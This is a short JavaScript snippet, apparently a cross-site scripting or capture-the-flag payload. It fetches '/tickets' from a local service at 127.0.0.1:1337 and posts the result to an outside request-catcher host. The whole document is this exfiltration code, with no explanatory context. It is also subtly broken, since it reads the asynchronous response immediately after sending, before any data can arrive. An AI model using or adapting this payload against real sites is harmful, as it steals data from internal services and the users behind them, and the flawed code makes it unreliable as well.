const xhrr = new XMLHttpRequest();
xhrr.open("GET", "http://127.0.0.1:1337/tickets",true);

xhrr.send();
v = xhrr.response;



const xhr = new XMLHttpRequest();
xhr.open("POST", "https://lemon.requestcatcher.com/", true);
let data = v;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
xhr.send(data);
